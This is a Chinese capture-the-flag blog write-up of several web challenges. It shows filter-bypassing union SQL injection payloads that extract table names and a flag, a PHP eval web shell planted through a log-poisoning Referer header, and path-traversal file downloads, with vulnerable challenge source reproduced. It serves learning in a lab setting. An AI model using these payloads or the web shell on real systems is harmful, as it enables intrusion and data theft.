<p>进去就是一个登录页面，反射性想到二次注入。<br>注册了个admin’ 登录进去，发现没啥事。<br>又发现有个广告啥的。标题内容都填了test’。还是没事<br>点进去看广告详情。诶。报错了。注入点在广告标题处。<br>然后就开始fuzz.发现过滤了and or 空格，extractvalue updatexml,information_schema.<br>看这样样子只能用union select了。<br>爆列的时候我就8行了。试了15列。感觉自己方向错了。看wp。<br>嗯。有他妈的22列(抱歉粗口了)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>
<p>本以为这样之后我就会做了。接下来发现过滤了information_schema.好吧，这就是我知识盲区了。<br>找了一下，发现如下两个payload用来爆表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;   </span><br><span class="line">-1&apos;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_index_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>
<p>分别是这两位大佬的文章<a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">传送门</a> <a href="https://blog.csdn.net/weixin_43900387/article/details/103534108" target="_blank" rel="noopener">传送门</a><br>不过本题使用第一个payload居然失败了。。应该是没有给每个表自增一个id或者名字。关于绕过information_schema的过滤详情可以参见这里<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">传送门</a><br>应该可以说这里一般是两种方法在过滤了information_schema的情况下拿表名了</p>
<ul>
<li>innodb引擎绕过</li>
<li>sys.schema_auto_increment_columns绕过</li>
<li>在mysql5.6及以上版本中innodb_index_stats和innodb_table_stats两个表中都包含所有新创建的数据库和表名(本题实验确实都查到了)</li>
</ul>
<hr>
<p>本题使用innodb绕过，拿到表名。接下来就是无列名注入了。这里可以参考刚才二向箔安全的文章。讲得比较好<br>题里有几个表，但是flag在users表里。<br>要查表还得先判断表有几列。构造如下payload，然后再分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br><span class="line">-1&apos;union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1/**/as/**/b,2/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br><span class="line">-1&apos;union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1/**/as/**/b,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>
<p>最后试除来user表有三列。第一列对应的应该是id。先解释一下上面的payload是个什么意思吧。<br>以第三条为例。只看<code>(select/**/group_concat(b)/**/from/**/(select/**/1/**/as/**/b,2,3/**/union/**/select/**/*/**/from/**/users)a)</code>这段。<br>其他的只是因为这里查询了22列。为了用联合才把payload弄得这么长。回显的列只有第二和第三列。而我们选择了第二列来用作数据回显，也就是这个例句。<br>先看gruop_concat(b)这里的意思就是将b这一列对应的查询结果连作一行返回。所以这里最后只有一条数据，能够在这一列(对应22列查询中的第2列)中正常显示。<br>那b到底对应的哪一列呢？其实这里的b是我们给未知列起的别名。我们用了三个payload来试出了users表中有三列(注意里面是对users的union select)。并且给查询结果的第一列起了个别名b(注意有个as b)。<br>我们知道关系型数据库查询结果也是关系(也就是一张二维表)。我们要对这个结果表起名才能不报错(注意from后面那一串的括号外面有个a。这是起别名的简化方式。也可以用as a的方式起别名)<br>那这里就是这一句话的意思就是：<br>指定1，2，3这三列和users联合查询，并且给1这一列起了个别名b。然后<code>select 1,2,3 union select * from users;</code>这个查询的结果(也就是一张表)，我们给起了个别名叫a。<br>随后再执行了 <code>select group_concat(b) from a</code>。就相当于从a这个表中查询b这一列的结果连起来当成一个字符串给你返回回来。最终就显示在对应位置了。<br>刚才的users的第一列对应的其实是id这一列。我们看看第二列里面有啥。稍微改动一下payload，如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>
<p>在这里发现了名为flag的用户。看来这一列对应的是username之类的。<br>那我们要的flag应该就在第三列了。同样改动一下payload。如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>
<p>成功拿到flag。<br>这题我是看了wp的。不过最后也是自己理解了。学到了。<br>如果没看wp的话，不知道flag在users里。要多花点时间去试试呗。<br>肯定也是能注出来的</p>
<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>这道题还是学到很多的。绕过information_schema拿表名的方法啊。<br>无列名注入啊。感谢表哥们写出这么好的文章，出这么好的题。谢谢招待。</p>
<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>知识点：</p>
<ul>
<li>文件包含日志getshell</li>
</ul>
<hr>
<p>这题题目就叫include了。很明显的包含题。<br>参数有个?file=xxx<br>也是提示了我们这道题是包含。感觉现在我会的包含题只有两种，一种是先让你上传一个图片，再去包含它之类的(如果Include一个jpg文件，是会被当成php执行的)<br>另一种就是没有上传部分，直接尝试包含日志(这部分我们能够控制日志内容)，然后被包含的日志会被当作php解析，里面写的shellcode得以执行。<br>为了验证文件包含，可以包含一个/etc/passwd文件看看。包含成功了，那应该没跑了。一看服务器用的是nginx。这个服务器的访问日志默认在/var/log/nginx/access.log文件里。<br>一开始我包含这个文件，没有回显(很可能是卡了)。一度以为自己想错了。后来扫了后台之后突然就能回显出来了。。那就坚定了思路了嘛，修改一下访问的header头内容，写入一句话木马。<br>比如用bp抓包然后添加如下header头</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer:irrik&lt;?php eval($_POST[&apos;irrik&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>然后再去访问access.log这个文件，搜一下irrik.看到有这个内容了，不过后面的php代码因为被执行了所以没有回显出来。<br>这时候拿蚁剑连一下就好。</p>
<h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p>这道题算是让我加深了对文件包含的理解吧。之前一直和文件上传有点弄混了。<br>现在才知道如果去包含一个文件的话，不论文件是什么后缀名(.jpg,.log,.txt)，里面的内容都会被当成php代码去解析。正因为如此，本题才成功getshell了。<br>谢谢招待。</p>
<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>知识点</p>
<ul>
<li>phar伪协议</li>
<li>任意文件下载</li>
</ul>
<hr>
<p>这道题进去就是一个注册登录页面，一开始以为是注入题，登录进去之后发现是文件上传题。<br>尝试上传一个php文件，改了mime头发现能传，但是后缀变成了gif。<br>后来试了一会发现后缀只允许.jpg,.png,.gif。如果不是这三个后缀的话自动改位.gif。<br>这样的话就没办法上传.user.ini执行图片马了。<br>一下子没了思路，看到有个下载/删除功能。<br>下载，然后抓包看看。发现post了一个参数filename=xxx<br>修改一下这个参数的值为<code>../../../../../etc/passwd</code>，发现成功下载了文件。<br>这里就有一个任意文件下载漏洞了。但是我太菜了，到这就不行了。而且尝试下载index.php还失败了。<br>灰溜溜跑去看wp</p>
<hr>
<p>接下来才是重头戏。<br>先利用任意文件下载下载到了源码(太多了不一一列举了)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=../../index.php</span><br><span class="line">filename=../../download.php</span><br><span class="line">filename=../../class.php</span><br></pre></td></tr></table></figure>
<p>主要的文件代码放在这里分析</p>
<ul>
<li>upload.php<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;login&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_FILES[&quot;file&quot;])) &#123;</span><br><span class="line">    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    $pos = strrpos($filename, &quot;.&quot;);</span><br><span class="line">    if ($pos !== false) &#123;</span><br><span class="line">        $filename = substr($filename, 0, $pos);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $fileext = &quot;.gif&quot;;</span><br><span class="line">    switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123;</span><br><span class="line">        case &apos;image/gif&apos;:</span><br><span class="line">            $fileext = &quot;.gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case &apos;image/jpeg&apos;:</span><br><span class="line">            $fileext = &quot;.jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case &apos;image/png&apos;:</span><br><span class="line">            $fileext = &quot;.png&quot;;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Only gif/jpg/png allowed&quot;);</span><br><span class="line">            Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">            echo json_encode($response);</span><br><span class="line">            die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) &#123;</span><br><span class="line">        $dst = $_SESSION[&apos;sandbox&apos;] . $filename . $fileext;</span><br><span class="line">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);</span><br><span class="line">        $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);</span><br><span class="line">        Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">        echo json_encode($response);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Invaild filename&quot;);</span><br><span class="line">        Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">        echo json_encode($response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li>delete.php<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;login&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;filename&apos;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&apos;sandbox&apos;]);</span><br><span class="line">$file = new File();</span><br><span class="line">$filename = (string) $_POST[&apos;filename&apos;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li>download.php<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;login&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;filename&apos;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&apos;sandbox&apos;]);</span><br><span class="line">$file = new File();</span><br><span class="line">$filename = (string) $_POST[&apos;filename&apos;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123;</span><br><span class="line">    Header(&quot;Content-type: application/octet-stream&quot;);</span><br><span class="line">    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));</span><br><span class="line">    echo $file-&gt;close();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;File not exist&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li>class.php<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$dbaddr = &quot;127.0.0.1&quot;;</span><br><span class="line">$dbuser = &quot;root&quot;;</span><br><span class="line">$dbpass = &quot;root&quot;;</span><br><span class="line">$dbname = &quot;dropbox&quot;;</span><br><span class="line">$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function user_exist($username) &#123;</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        if ($count === 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function add_user($username, $password) &#123;</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function verify_user($username, $password) &#123;</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files = array();</span><br><span class="line">        $this-&gt;results = array();</span><br><span class="line">        $this-&gt;funcs = array();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        $key = array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file = new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] = array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($func, $args) &#123;</span><br><span class="line">        array_push($this-&gt;funcs, $func);</span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $table = &apos;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&apos;;</span><br><span class="line">        $table .= &apos;&lt;thead&gt;&lt;tr&gt;&apos;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&apos; . htmlentities($func) . &apos;&lt;/th&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&apos;;</span><br><span class="line">        $table .= &apos;&lt;/thead&gt;&lt;tbody&gt;&apos;;</span><br><span class="line">        foreach ($this-&gt;results as $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= &apos;&lt;tr&gt;&apos;;</span><br><span class="line">            foreach ($result as $func =&gt; $value) &#123;</span><br><span class="line">                $table .= &apos;&lt;td class=&quot;text-center&quot;&gt;&apos; . htmlentities($value) . &apos;&lt;/td&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= &apos;&lt;td class=&quot;text-center&quot; filename=&quot;&apos; . htmlentities($filename) . &apos;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&apos;;</span><br><span class="line">            $table .= &apos;&lt;/tr&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    public function open($filename) &#123;</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function name() &#123;</span><br><span class="line">        return basename($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function size() &#123;</span><br><span class="line">        $size = filesize($this-&gt;filename);</span><br><span class="line">        $units = array(&apos; B&apos;, &apos; KB&apos;, &apos; MB&apos;, &apos; GB&apos;, &apos; TB&apos;);</span><br><span class="line">        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function detele() &#123;</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function close() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li>index.php<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;login&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">$a = new FileList($_SESSION[&apos;sandbox&apos;]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li>register.php<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_SESSION[&apos;login&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: index.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class="line">    $u = new User();</span><br><span class="line">    $username = (string) $_POST[&quot;username&quot;];</span><br><span class="line">    $password = (string) $_POST[&quot;password&quot;];</span><br><span class="line">    if (strlen($username) &lt; 20 